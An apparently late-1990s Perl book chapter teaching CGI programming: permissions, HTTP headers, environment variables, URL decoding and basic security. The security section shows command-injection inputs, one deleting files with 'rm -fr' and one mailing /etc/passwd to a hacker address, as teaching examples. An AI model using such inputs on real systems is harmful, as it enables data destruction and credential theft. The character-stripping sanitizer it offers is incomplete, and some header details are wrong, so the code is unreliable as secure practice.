# What is CGI?

<P>CGI, or <B>C</B>ommon <B>G</B>ateway <B>I</B>nterface, is the standard 
programming interface between web servers and external programs. It is almost 
one of the most exciting and fun areas of programming today. The CGI standard 
lets web browsers pass information to programs written in any language. If you 
want to create a lightning-fast search engine, then your CGI program will most 
likely be written in C or C++. However, most other applications can use Perl. 
<P>The CGI standard does not exist in isolation, it is dependent on the HTML and 
HTTP standards. HTML is the standard that lets web browsers understand document 
content. HTTP is the communications protocol that, among other things, lets web 
servers talk with web browser. 
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=lightcyan size=4><B>Note</B></FONT></TD></TR>
  <TR>
    <TD bgColor=lightcyan>If you are unfamiliar with HTML, you might want to 
      skip to the HTML introduction in Chapter 20, "<A 
      href="ch20.htm">Form Processing</A>," before 
      continuing. Otherwise, take the HTML references in this chapter at face 
      value.</TD></TR></TBODY></TABLE>
<P>Almost anyone can throw together some HTML and hang a "home page" out on the 
web. But most sites out there are, quite frankly, boring. Why? The fact is that 
most sites are built as a simple series of HTML documents that never change. The 
site is completely static. No one is likely to visit a static page more than 
once or twice. Think about the sites you visit most often. They probably have 
some interesting content, certainly, but more importantly, they have dynamic 
content. 
<P>So what's a webmaster to do? No webmaster has the time to update their web 
site by hand every day. Fortunately, the people who developed the web protocol 
thought of this problem and gave us CGI. CGI gives you a way to make web sites 
dynamic and interactive. 
<P>Each word in the acronym, "Common Gateway Interface," helps to understand the 
interface: 
<P>
<UL>
  <LI><B>Common</B> - interacts with many different operating systems. 
  <P></P>
  <LI><B>Gateway</B> - provides users with a way to gain access to different 
  programs, like databases or picture generators. 
  <P></P>
  <LI><B>Interface</B> - uses a well-defined method to interact with a web 
  server.</LI></UL>
<P>CGI applications can perform nearly any task that your imagination can think 
up. For example, you can create web pages on-the-fly, access databases, hold 
telnet sessions, generate graphics, and compile statistics. 
<P>The basic concept behind CGI is pretty simple, however, actually creating CGI 
applications is not. That requires real programming skills. You need to be able 
to debug programs and make logical connections between one idea and another. You 
also need to have the ability to visualize the application that you'd like to 
create. This chapter and the next, "<A 
href="ch20.htm">Form Processing</A>," will get you 
started with CGI programming. If you plan to create large applications, you 
might want to look at Que's "Special Edition, Using CGI". 
<H2><A name="Why use Perl for CGI">Why use Perl for CGI?</A></H2>Perl is the de 
facto standard for CGI programming for a number of reasons, but perhaps the most 
important are: 
<P>
<UL>
  <LI><B>Socket Support</B> - create programs that interface seamlessly with 
  Internet protocols. Your CGI program can send a web page in response to a 
  transaction and send a series of email messages to inform interested people 
  that the transaction happened. 
  <P></P>
  <LI><B>Pattern Matching</B> - ideal for handling form data and searching text. 

  <P></P>
  <LI><B>Flexible Text Handling</B> - no details to worry. The way that Perl 
  handles strings, in terms of memory allocation and deallocation, fades into 
  the background as you program. You simply can ignore the details of 
  concatenating, copying and creating new strings.</LI></UL>
<P>The advantage of an interpreted language in CGI applications is its 
simplicity in development, debugging and revision. By removing the compilation 
step, you and I can move more quickly from task to task, without the frustration 
that can sometimes arise from debugging compiled programs. Of course not any 
interpreted language will do. Perl has the distinct advantage of having an 
extremely rich and capable functionality. 
<P>There are some times when a mature CGI application should be ported to C or 
another compiled language. These are the web applications where speed is 
important. If you expect to have a very active site, you probably want to move 
to a compiled language because they run faster. 
<H2><A name="CGI Apps vs Java Applets">CGI Apps vs Java Applets</A></H2>CGI and 
Java are two totally different animals. CGI is a specification that can be used 
by any programming language. CGI applications are run on a web server. Java is a 
programming language that is run on the client side. 
<P>CGI applications should be designed to take advantage of the centralized 
nature of a web server. They are great for searching databases, processing HTML 
form data, and other applications that require limited interaction with a user. 
<P>Java applications are good when you need a high degree of interaction with 
users; for example, games or animation. 
<P>Java programs need to be kept relatively small because they are transmitted 
through the Internet to the client. CGI applications on the other hand can be as 
large as needed because they reside and are executed on the web server. 
<P>You can design your web site to use both Java and CGI applications. For 
example, you might want to use Java on the client side to do field validation 
when collecting information on a form. Then once the input has been validated, 
the Java application can send the information to a CGI application on the web 
server where the database resides. 
<H2><A name="Should You Use CGI Modules">Should You Use CGI Modules?</A></H2>I 
encourage you to use the CGI modules that are available on the Internet. The 
most up-to-date module that I know about is called <TT>cgi.pm</TT> - but you 
must be using Perl v5.002 or an even newer version in order to use it. 
<TT>cgi.pm</TT> is very comprehensive and covers many different protocols in 
addition to the basic CGI standard. 
<P>You might find that <TT>CGI.pm</TT> is overkill for simple CGI applications. 
If so, look at <TT>cgi-lite.pl</TT>. This library doesn't do as much as 
<TT>CGI.pm</TT> but you'll probably find that it is easier to use. 
<P>You can find both of these scripts at one of the CPAN web sites that are 
mentioned in Chapter 22, "<A 
href="ch22.htm">Internet Resources</A>." 
<P>However in this book, I have purposely not used these scripts. I feel it is 
important for you to understand the mechanisms behind the protocols. This will 
make debugging your applications easier because you'll have a better idea what 
the modules are doing behind the scenes. You will also be able to make better 
use of pre-existing modules if you can make educated guesses about what a poorly 
documented function does. 
<H2><A name="How does CGI Work">How does CGI Work?</A></H2>CGI programs are 
always placed on a disk that the web server has access to. This means that if 
you are using a dial-up account to maintain your web site, you need to upload 
your CGI programs to the server before they can be run. 
<P><B>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=lightpink size=4><B>Tip</B></FONT></TD></TR>
  <TR>
    <TD bgColor=lightpink>You can test your scripts locally as long as you can 
      use Perl on your local machine. See the "<A 
      href="ch19.htm#Debugging CGI Programs">Debugging 
      CGI Programs</A>" section later in this chapter.</TD></TR></TBODY></TABLE></B>
<P>Web servers are generally configured so that all CGI applications are placed 
into a <TT>cgi-bin</TT> directory. However, the web server may have aliases so 
that "virtual directories" exist. Each user might have their own 
<TT>cgi-bin</TT> directory. The directory location is totally under the control 
of your web site administrator. 
<P><B>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=lightpink size=4><B>Tip</B></FONT></TD></TR>
  <TR>
    <TD bgColor=lightpink>Finding out which directory your scripts need to be 
      placed in is the first step in creating CGI programs. Since you need to 
      get this information from your web site administrator, send an email 
      message right now requesting this information. Also ask if there are any 
      CGI restrictions or guidelines that you need to 
follow.</TD></TR></TBODY></TABLE></B>
<H2><A name="Calling Your CGI Program">Calling Your CGI Program</A></H2>The 
easiest way to run a CGI program is to type in the URL of the program into your 
web browser. The web server should recognize that you are requesting a CGI 
program and execute it. For example, if you already had a CGI program called 
<TT>test.pl</TT> running on a local web server, you could start it by entering 
the following URL into your web browser: 
<P><B><PRE>http://localhost/cgi-bin/test.pl</PRE></B>The web server will execute your 
CGI script and any output is displayed by your web browser. 
<P>The URL for your CGI program is a <I>virtual</I> path. The actual location of 
the script on the web server depends on the configuration of the server software 
and the type of computer being used. For example, if your computer is running 
the Linux operating system and the NCSA web server in a "standard" configuration 
then the above virtual would translate into 
<TT>/usr/local/etc/httpd/cgi-bin/test.pl</TT>. If you were running the webSite 
server under Windows 95, the translated path might be 
<TT>/website/cgi-shl/test.pl</TT>. 
<P>If you have installed and are administering the web server yourself, you 
probably know where to place your scripts. If you are using a service provider's 
web server, ask the server's administrator where to put your scripts and how to 
reference them from your documents. 
<P>There are other ways to invoke CGI programs besides using a web browser to 
visit the URL. You can also start CGI programs from: 
<P>
<UL>
  <LI>a hypertext link. For Example: 
  <P><B><PRE>&lt;A HREF="cgi-bin/test.pl"&gt;Click here to run a CGI program&lt;/A&gt;</PRE></B>
  <LI>a button on an HTML form. You can read more about HTML forms in Chapter 
  20, "<A href="ch20.htm">Form Processing</A>." 
  <P></P>
  <LI>a server-side include. You can read more about server-side includes in 
  Chapter 20, "<A href="ch20.htm">Form 
  Processing</A>." </LI></UL>
<P>Interestingly enough you can pass information to your CGI program by adding 
extra information to the standard URL. If your CGI program is used for searching 
your site, for example, you can pass some information to specify which directory 
to search. The following HTML hyperlink will invoke a search script and tell it 
to search the <TT>/root/document</TT> directory. 
<P><B><PRE>&lt;A HREF="cgi-bin/search.pl/root/document"&gt;Search the Document Directory&lt;/A&gt;</PRE></B>This 
<I>extra</I> path information can be accessed through the <TT>PATH_INFO</TT> 
environment variable. 
<P>You can also use a question mark to pass information to a CGI program. 
Typically a question mark indicates that you are passing keywords that will be 
used in a search. 
<P><B><PRE>&lt;A HREF="cgi-bin/search.pl?Wine+1993"&gt;Search for 1993 Wines&lt;/A&gt;</PRE></B>The 
information that follows the question mark will be available to your CGI program 
through the QUERY_STRING environment variables. 
<P>Using either of these approaches will let you create <I>canned</I> CGI 
requests. By creating these requests ahead of time, you can reduce the amount of 
typing errors that your users might otherwise have. Later in this chapter, the 
"<A 
href="ch19.htm#CGI and Environment Variables">CGI 
and Environment Variables</A>" section discusses all of the environment 
variables you can use inside CGI programs. 
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=lightcyan size=4><B>Note</B></FONT></TD></TR>
  <TR>
    <TD bgColor=lightcyan>Generally speaking, visitors to your web site should 
      never have to type in the URL for a CGI program. A hypertext link should 
      always be provided to start the program.</TD></TR></TBODY></TABLE>
<H2><A name="Your First CGI Program">Your First CGI Program</A></H2>You can use 
any text editor or word processor in the world to create your CGI programs 
because they are simply Perl programs that are invoked by a URL instead of the 
command line. Listing 19.1 contains a five line CGI program - nearly the 
smallest program you can have. 
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=blanchedalmond 
      size=4><B>Pseudocode</B></FONT></TD></TR>
  <TR>
    <TD bgColor=blanchedalmond><TT>
      <P>Turn on the warning option. 
      <P>Turn on the strict pragma. 
      <P>Send the HTTP header to the web browser. 
      <P>Send a line of text to the web browser.</TT></P></TD></TR></TBODY></TABLE>
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=#fffaa0 size=4><B>
      <P>Listing 19.1-19LST01.PL - A Very Small CGI Program</B></FONT></P></TD></TR>
  <TR>
    <TD bgColor=#fffaa0><B><PRE><BR>
<P>#!/usr/local/bin/perl -w
use strict;

print "Content-type: text/plain\n\n";
print "Hello, World.\n";</B></P></PRE></TT></TD></TR></TBODY></TABLE>
<P>The file that contains this CGI program should be placed in your web server's 
<TT>cgi-bin</TT> directory. Then, the URL for this program will be something 
like <TT>http://localhost/cgi-bin/test.pl</TT> (change localhost to correspond 
to your web server's hostname). Enter this URL into your web browser and it 
should display a web page saying "This is a test." 
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=lightcyan size=4><B>Note</B></FONT></TD></TR>
  <TR>
    <TD bgColor=lightcyan>You may wonder how the web server knows that a CGI 
      program should be executed instead of being displayed. This is an 
      excellent question. It can be best answered by referring to the 
      documentation that came with your particular server.</TD></TR></TBODY></TABLE>
<P>When the web server executes your CGI program, it automatically opens the 
<TT>STDIN</TT>, <TT>STDOUT</TT>, and <TT>STDERR</TT> file handles for you. 
<P>
<UL>
  <LI><B><TT>STDIN</TT></B> - The standard input of your CGI program might 
  contain information that was generated by an HTML form. Otherwise, you 
  shouldn't use STDIN. 
  <P></P>
  <LI><B><TT>STDOUT</TT></B> - The standard output of your CGI program is linked 
  to the <TT>STDIN</TT> of the web browser. This means you when you print 
  information using the <TT>print()</TT> function, you are essentially writing 
  directly to the web browser's window. This link will be discussed further in 
  the "<A href="ch19.htm#HTTP Headers">HTTP 
  Headers</A>" section later in this chapter. 
  <P></P>
  <LI><B><TT>STDERR</TT></B> - The standard output of your CGI program is linked 
  to the web server's log file. This is very useful when you are debugging your 
  program. Any output from the <TT>die()</TT> or <TT>warn()</TT> function will 
  be placed into in the server's log file. The STDERR file handle is discussed 
  further in the "<A 
  href="ch19.htm#Debugging CGI Programs">Debugging 
  CGI Programs</A>" section later in this chapter.</LI></UL>
<P>The web server will also make some information available to your CGI program 
through environment variables. You may recall the %ENV hash from Chapter 12, "<A 
href="ch12.htm">Using Special Variables</A>." 
Details about the environment variables that you can use can be found in the "<A 
href="ch19.htm#CGI and Environment Variables">CGI 
and Environment Variables</A>" section later in this chapter. 
<H2><A name="Why Are File Permissions Important in UNIX">Why Are File 
Permissions Important in UNIX?</A></H2>File permission controls who can access 
files in UNIX systems. Quite often I hear of beginning CGI programmers that try 
to write files into a directory in which they do not have write permission. UNIX 
permissions are also called <I>rights</I>. 
<P>UNIX can control file access in a number of ways. There are three levels of 
permissions for three classes of users. To view the permissions on a file use 
the <TT>ls</TT> command with the <TT>-l</TT> command-line option. For Example: 
<P><B><PRE>C:indyunix:~/public_html/pfind&gt;<B>ls -l</B>
total 40
-rw-r--r--   1 dbewley  staff        139 Jun 18 14:14 home.html
-rwxr-xr-x   1 dbewley  staff       9145 Aug 14 07:06 pfind
drwxr-xr--   2 dbewley  staff        512 Aug 15 07:11 tmp</PRE></B>Each line of 
this listing indicates a separate directory entry. The first character of the 
first column is normally either a dash or the letter <TT>d</TT>. If a directory 
entry has a <TT>d</TT> it means that the entry is a subdirectory of the current 
directory. 
<P>The other nine characters are the file permissions. Permissions should be 
thought of in groups of three, for the three classes of user. The three classes 
of user are: 
<P>
<UL>
  <LI><B>user</B> - the owner of the file or directory. The owner's name is 
  displayed in the third column of the <TT>ls</TT> command's output. 
  <P></P>
  <LI><B>group</B> - the group that owns the file. Files can have both 
  individual owners and a group. Several users can belong to a single group. 
  <P></P>
  <LI><B>others</B> - any user that is not the owner or in the group that owns 
  the file.</LI></UL>
<P>Each of the classes can have one or more of the following three levels of 
permission: 
<P>
<UL>
  <LI><B>r</B> - the class can read the file or directory. 
  <P></P>
  <LI><B>w</B> - the class can write to the file or directory. 
  <P></P>
  <LI><B>x</B> - the class can execute the file or list the directory.</LI></UL>
<P>If a permission is not allowed to the user that ran the <TT>ls</TT> command, 
its position is filled with a dash. For example: 
<P><B><PRE>ls -l hform.html
-rwx------   1 dbewley  staff      11816 May  9 09:19 slideshow.pl</PRE></B>The 
owner, <TT>dbewley</TT>, has full rights - read, write, and execute for this 
file. The group, staff, and everyone else have no rights. 
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=lightpink size=4><B>Tip</B></FONT></TD></TR>
  <TR>
    <TD bgColor=lightpink>Perl scripts are not compiled, they must be read by 
      the perl interpreter each time they are run. Therefore, perl scripts 
      unlike compiled programs must have execute <I>and</I> read 
  permissions.</TD></TR></TBODY></TABLE>
<P>Here is another example: 
<P><B><PRE>ls -l pfind.pl
-rwxr-x---   1 dbewley  staff       2863 Oct 10 1995  pfind.pl</PRE></B>This 
time, the owner has full access while the group staff can read and execute the 
file. All others have no rights to this file. 
<P>Most HTML files will have permissions that look like this: 
<P><B><PRE>ls -l schedule.html
-rw-r--r--   1 dbewley  staff       2439 Feb  8 1996  schedule.html</PRE></B>Everyone 
can read it, but only the user can modify or delete it. There is no need have 
execute permission since HTML is not an executable language. 
<P>You can change the permissions on a file by using the <TT>chmod</TT> command. 
The <TT>chmod</TT> command recognizes the three classes of user as <TT>u</TT>, 
<TT>g</TT>, and <TT>o</TT> and the three levels of permissions as <TT>r</TT>, 
<TT>w</TT>, and <TT>x</TT>. It grants and revokes permissions with a <TT>+</TT> 
or <TT>-</TT> in conjunction with each permission that you want to change. It 
also will accept an <TT>a</TT> for all three classes of users at once. 
<P>The syntax of the <TT>chmod</TT> command is: 
<P><B><PRE>chmod &lt;options&gt; &lt;file&gt;</PRE></B>Here are some examples of the 
<TT>chmod</TT> command in action: 
<P><B><PRE>ls -l pfind.pl
-rw-------   1 dbewley  staff       2863 Oct 10 1995  pfind.pl
chmod u+x pfind.pl
ls -l pfind.pl
-rwx------   1 dbewley  staff       2863 Oct 10 1995  pfind.pl</PRE></B>The 
first <TT>ls</TT> command shows you the original file permissions. Then, the 
<TT>chmod</TT> command added execute permission for the owner (or user) of 
<TT>pfind.pl</TT>. The second <TT>ls</TT> command displays the newly changed 
permissions. 
<P>To add these permissions for the both the group and others classes use 
<TT>go+rx</TT> as in the following example. Remember, users must have at least 
read and execute permissions to run perl scripts. 
<P><B><PRE>ls -l pfind.pl
-rwx------   1 dbewley  staff       2863 Oct 10 1995  pfind.pl
chmod go+rx pfind.pl
ls -l pfind.pl
-rwxr-xr-x   1 dbewley  staff       2863 Oct 10 1995  pfind.pl</PRE></B>Now, any 
user can read and execute <TT>pfind.pl</TT>. Let's say a serious bug was found 
in pfind.pl and we don't want it to be executed by anyone. To revoke execute 
permission for all classes of user use the <TT>a-x</TT> option with the 
<TT>chmod</TT> command. 
<P><B><PRE>ls -l pfind.pl
-rwxr-xr-x   1 dbewley  staff       2863 Oct 10 1995  pfind.pl
chmod a-x pfind.pl
ls -l pfind.pl
-rw-r--r--   1 dbewley  staff       2863 Oct 10 1995  pfind.pl</PRE></B>Now, all 
users can read <TT>pfind.pl</TT>, but no one can execute it. 
<H2><A name="HTTP Headers">HTTP Headers</A></H2>The first line of output for 
most CGI programs must be an HTTP header that tells the client web browser what 
type of output it is sending back via <TT>STDOUT</TT>. Only scripts that are 
called from a server-side include are exempt from this requirement. 
<P>
<TABLE cellPadding=10 border=1>
  <CAPTION>Table 19.1 - A List of HTTP Headers</CAPTION>
  <TBODY>
  <TR>
    <TH align=left>Response Type </TH>
    <TH align=left>HTTP Header </TH></TR>
  <TR>
    <TD vAlign=top>Text </TD>
    <TD vAlign=top>Content Type: text/plain</TD></TR>
  <TR>
    <TD vAlign=top>HTML page </TD>
    <TD vAlign=top>Content Type: text/html</TD></TR>
  <TR>
    <TD vAlign=top>gif graphic </TD>
    <TD vAlign=top>Content Type: image/gif</TD></TR>
  <TR>
    <TD vAlign=top>Redirection to anther web page</TD>
    <TD vAlign=top>Location: http://www.foobar.com </TD></TR>
  <TR>
    <TD vAlign=top>Cookie </TD>
    <TD vAlign=top>Set-cookie: ...</TD></TR>
  <TR>
    <TD vAlign=top>Error Message </TD>
    <TD vAlign=top>Status: 402 </TD></TR></TBODY></TABLE>
<P>All HTTP headers must be followed by a blank line. Use the following line of 
code as a template: 
<P><B><PRE>print("Content Type: text/html\n\n");</PRE></B>Notice that the HTTP header 
is followed by <I>two</I> newline characters. This is very important. It ensures 
that a blank line will always follow the HTTP header. 
<P>If you have installed any helper applications for Netscape or are familiar 
with MIME types, you already recognize the <TT>text/plain</TT> and 
<TT>text/html</TT> parts of the <TT>Content Type</TT> header. They tell the 
remote web browser what type of information you are sending. The two most common 
MIME types to use are <TT>text/plain</TT> and <TT>text/html</TT>. 
<P>The <TT>Location</TT> header is used to redirect the client web browser to 
another web page. For example, let's say that your CGI script is designed to 
randomly choose from among 10 different URLs to order to determine the next web 
page to display. Once the new web page is choosen, your program outputs it like 
this: 
<P><B><PRE>print("Location: $nextPage\n\n");</PRE></B>Once the <TT>Location</TT> 
header has been printed, nothing else should be printed. That is all the 
information that the client web browser needs. 
<P>Cookies and the <TT>Set-cookie:</TT> header are discussed in the "<A 
href="ch19.htm#Cookies">Cookies</A>" section later 
in this chapter. 
<P>The last type of HTTP header is the <TT>Status</TT> header. This header 
should be sent when an error arises in your script that your program is not 
equipped to handle. I feel that this HTTP header should not be used unless you 
are under severe time pressure to complete a project. You should try to create 
your own error handling routines that display a full web page that explains the 
error that happened and what the user can do to fix or circumvent it. You might 
include the time, date, type of error, contact names and phone numbers and any 
other information that might be useful to the user. Relying on the standard 
error messages of the web server and browser will make your web site less user 
friendly. 
<H2><A name="CGI and Environment Variables">CGI and Environment 
Variables</A></H2>You are already familiar with environment variables if you 
read Chapter 12, "<A href="ch12.htm">Using Special 
Variables</A>." When your CGI program is started, the web server creates and 
initializes a number of environment variables that your program can access using 
the <TT>%ENV</TT> hash. 
<P>Table 19.2 contains a short description of each environment variable. A 
complete description of the environmental variables used in CGI programs can be 
found at 
<P><B><PRE>http://www.ast.cam.ac.uk/~drtr/cgi-spec.html</PRE></B>
<TABLE cellPadding=10 border=1>
  <CAPTION>Table 19.2 - CGI Environment Variables</CAPTION>
  <TBODY>
  <TR>
    <TH align=left>CGI Environment Variables </TH>
    <TH align=left>Description </TH></TR>
  <TR>
    <TD vAlign=top>AUTH_TYPE </TD>
    <TD vAlign=top>Optionally provides the authentication protocol used to 
      access your script if the local web server supports authentication and if 
      authentication was used to access your script.</TD></TR>
  <TR>
    <TD vAlign=top>CONTENT_LENGTH </TD>
    <TD vAlign=top>Optionally provides the length, in bytes, of the content 
      provided to the script through the <TT>STDIN</TT> file handle. Used 
      particularly in the <TT>POST</TT> method of form processing. See Chapter 
      20, "<A href="ch20.htm">Form Processing</A>," 
      for more information.</TD></TR>
  <TR>
    <TD vAlign=top>CONTENT_TYPE </TD>
    <TD vAlign=top>Optionally provides the type of content available from the 
      <TT>STDIN</TT> file handle. This is used for the <TT>POST</TT> method of 
      form processing. Most of the time this variable will be blank and you can 
      assume a value of <TT>application/octet-stream</TT>. </TD></TR>
  <TR>
    <TD vAlign=top>GATEWAY_INTERFACE </TD>
    <TD vAlign=top>Provides the version of CGI supported by the local web 
      server. Most of the time this will be equal to <TT>CGI/1.1</TT>.</TD></TR>
  <TR>
    <TD vAlign=top>HTTP_ACCEPT </TD>
    <TD vAlign=top>Provides a comma-separated list of MIME types the browser 
      software will accept. You might check this environmental variable to see 
      if the client will accept a certain kind of graphic file</TD></TR>
  <TR>
    <TD vAlign=top>HTTP_USER_AGENT </TD>
    <TD vAlign=top>Provides the type and version of the user's web browser. 
      For example, the Netscape web browser is called Mozilla.</TD></TR>
  <TR>
    <TD vAlign=top>HTTP_FROM </TD>
    <TD vAlign=top>Provides the user's email address. Not all web browsers 
      will supply this information to your server. Therefore, only use this 
      field to provide a default value for an HTML form.</TD></TR>
  <TR>
    <TD vAlign=top>QUERY_STRING </TD>
    <TD vAlign=top>Optionally contains form information when the GET method of 
      form processing is used. QUERY_STRING is also used for passing information 
      like search keywords to CGI scripts.</TD></TR>
  <TR>
    <TD vAlign=top>PATH_INFO </TD>
    <TD vAlign=top>Optionally contains any extra path information from the 
      HTTP request that invoked the script.</TD></TR>
  <TR>
    <TD vAlign=top>PATH_TRANSLATED </TD>
    <TD vAlign=top>Maps the script's virtual path (i.e. from the root of the 
      server directory) to the physical path used to call the script.</TD></TR>
  <TR>
    <TD vAlign=top>REMOTE_ADDR </TD>
    <TD vAlign=top>Contains the dotted decimal address of the user.</TD></TR>
  <TR>
    <TD vAlign=top>REMOTE_HOST </TD>
    <TD vAlign=top>Optionally provides the domain name for the site that the 
      user has connected from.</TD></TR>
  <TR>
    <TD vAlign=top>REMOTE_IDENT </TD>
    <TD vAlign=top>Optionally provides client identification when your local 
      server has contacted an IDENTD server on a client machine. You will very 
      rarely see this because the IDENTD query is slow.</TD></TR>
  <TR>
    <TD vAlign=top>REMOTE_USER </TD>
    <TD vAlign=top>Optionally provides the name used by the user to access 
      your secured script. </TD></TR>
  <TR>
    <TD vAlign=top>REQUEST_METHOD </TD>
    <TD vAlign=top>Usually contains either "GET" or "POST" - the method by 
      which form information will be made available to your script. See Chapter 
      20, "<A href="ch20.htm">Form Processing</A>," 
      for more information.</TD></TR>
  <TR>
    <TD vAlign=top>SCRIPT_NAME </TD>
    <TD vAlign=top>Contains the virtual path to the script.</TD></TR>
  <TR>
    <TD vAlign=top>SERVER_NAME </TD>
    <TD vAlign=top>Contains the configured hostname for the server.</TD></TR>
  <TR>
    <TD vAlign=top>SERVER_PORT </TD>
    <TD vAlign=top>Contains the port number that the local web server software 
      is listening on. The standard port number is 80.</TD></TR>
  <TR>
    <TD vAlign=top>SERVER_PROTOCOL </TD>
    <TD vAlign=top>Contains the version of the web protocol this server uses. 
      For example, <TT>HTTP/1.0</TT>.</TD></TR>
  <TR>
    <TD vAlign=top>SERVER_SOFTWARE </TD>
    <TD vAlign=top>Contains the name and version of the web server software. 
      For example, <TT>webSite/1.1e</TT>.</TD></TR></TBODY></TABLE>
<H2><A name="URL Encoding">URL Encoding</A></H2>One of the limitations have 
placed on the HTTP protocol by the WWW organizations is that the content of the 
commands, responses, and data - passed between client and server - should be 
clearly defined. It is sometimes difficult to tell simply from the context 
whether a space character is a field delimiter or an integral part of the data - 
like the space in "David Medinets". 
<P>To clear up the ambiguity, the URL encoding scheme was created. Any spaces 
are converted into plus (<TT>+</TT>) signs to avoid semantic ambiguities. In 
addition, special characters or 8-bit values are converted into their 
hexadecimal equivalents and prefaced with a percent sign (<TT>%</TT>). For 
example, the string <TT>Davy Jones &lt;dj@mtolive.com&gt;</TT> is encoded as 
<TT>Davy+Jones+%3Cdj@mtolive.com%3E</TT>. If you look closely, you see that the 
<TT>&lt;</TT> character has been converted to <TT>%3C</TT> and the <TT>&gt;</TT> 
character has been coverted to <TT>%3E</TT>. 
<P>Your CGI script will need to be able to convert URL encoded information back 
into its normal form. Fortunately, Listing 19.2 contains a function that 
converts URL encoded information. 
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=blanchedalmond 
      size=4><B>Pseudocode</B></FONT></TD></TR>
  <TR>
    <TD bgColor=blanchedalmond><TT>
      <P>Define the decodeURL() function. 
      <P>Get the encoded string from the parameter array. 
      <P>Translate all plus signs into spaces. 
      <P>Convert character coded as hexadecimal digits into regular characters. 
      <P>Return the decoded string. </TT></P></TD></TR></TBODY></TABLE>
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=#fffaa0 size=4><B>
      <P>Listing 19.2-19LST02.PL - How to Decode the URL 
    Encoding</B></FONT></P></TD></TR>
  <TR>
    <TD bgColor=#fffaa0><B><PRE><BR>
<P>sub decodeURL {
    $_ = shift;
    tr/+/ /;
    s/%(..)/pack('c', hex($1))/eg;
    return($_);
}</B></P></PRE></TT></TD></TR></TBODY></TABLE>
<P>This function will be used in Chapter 20, "<A 
href="ch20.htm">Form Processing</A>," to decode 
form information. It is presented here because canned queries also use URL 
encoding. 
<H2><A name=Security>Security</A></H2>CGI really has only one large security 
hole that I can see. If you pass information that came from a remote site to an 
operating system command, you are asking for trouble. I think an example is 
needed to understand the problem because it is not obvious. 
<P>Suppose that you had a CGI script that formatted a directory listing and 
generated a web page that let visitors view the listing. In addition, let's say 
that the name of the directory to display was passed to your program using the 
<TT>PATH_INFO</TT> environment variable. The following URL could be used to call 
your program: 
<P><B><PRE>http://www.foo.com/cgi-bin/dirlist.pl/docs</PRE></B>Inside your program, 
the <TT>PATH_INFO</TT> environment variable is set to <TT>docs</TT>. In order to 
get the directory listing, all that is needed is a call to the <TT>ls</TT> 
command in UNIX or the <TT>dir</TT> command in DOS. Everything looks good right? 

<P>But what if the program was invoked with this command line? 
<P><B><PRE>http://www.foo.com/cgi-bin/dirlist.pl/; rm -fr;</PRE></B>Now, all of a 
sudden, you are faced with the possibility of files being deleted because the 
semi-colon (;) lets multiple commands be executed on one command line. 
<P>This same type of security hole is possible any time you try to run an 
external command. You might be tempted to use the <TT>mail</TT>, 
<TT>sendmail</TT>, or <TT>grep</TT> commands to save time while writing your CGI 
program, but since all of these programs are easily duplicated using Perl try to 
resist the temptation. 
<P>Another security hole is related to using external data to open or create 
files. Some enterprising hacker could use <TT>"| mail hacker@hacker.com &lt; 
/etc/passwd"</TT> as the filename to mail your password file or any other file 
to himself. 
<P>All of these security holes can be avoided by removing the dangerous 
characters (like the <TT>|</TT> or pipe character). 
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=blanchedalmond 
      size=4><B>Pseudocode</B></FONT></TD></TR>
  <TR>
    <TD bgColor=blanchedalmond><TT>
      <P>Define the improveSecurity() function. 
      <P>Copy the passed string into $_, the default search space. 
      <P>Protect against command-line options by removing - and + characters. 
      <P>Additional protection against command-line options. 
      <P>Convert all dangerous characters into harmless underscores. 
      <P>Return the $_ variable.</TT></P></TD></TR></TBODY></TABLE>
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=#fffaa0 size=4><B>
      <P>Listing 19.3-19LST03.PL - How to Remove Dangerous 
      Characters</B></FONT></P></TD></TR>
  <TR>
    <TD bgColor=#fffaa0><B><PRE><BR>
<P>sub improveSecurity {
    $_ = shift;
    s/\-+(.*)/\1/g;
    s/(.*)[ \t]+\-(.*)/$1$2/g;
    tr/\$\'\`\"\&lt;\&gt;\/\;\!\|/_/;
    return($_);
}</B></P></PRE></TT></TD></TR></TBODY></TABLE>
<H2><A name="CGIwrap and Security">CGIwrap and Security</A></H2>
<P>CGIwrap (<B><A 
href="http://wwwcgi.umr.edu/~cgiwrap/">http://wwwcgi.umr.edu/~cgiwrap/</A></B>) 
is a UNIX based utility written by Nathan Neulinger which lets general users run 
CGI scripts without needing access to the server's <TT>cgi-bin</TT> directory. 
Normally all scripts must be located in the server's main <TT>cgi-bin</TT> 
directory and all run with the same UID (user id) as the web server. CGIwrap 
performs various security checks on the scripts before changing id to match the 
owner of the script. All scripts are executed with same the user id as the user 
who owns them. CGIwrap works with NCSA, Apache, CERN, Netsite, and probably any 
other UNIX web server. 
<P>Any files created by a CGI program are normally owned by the web server. This 
can cause a problem if you need to edit or remove files created by CGI programs. 
You might have to ask the system administrator for help because you lack the 
proper authorization. All CGI programs have the same system permissions as the 
web server. If you run your web server under the root user id - being either 
very brave or very foolish - a CGI program could be tricked into erasing the 
entire hard drive. CGIwrap provides a way around these problems. 
<P>With CGIwrap, scripts are located in users' <TT>public_html/cgi-bin</TT> 
directory and run under their user id. This means that any files the CGI program 
creates are owned by the same user. Damage caused by any security bugs you may 
have introduced - via the CGI program - will be limited to your own set of 
directories. 
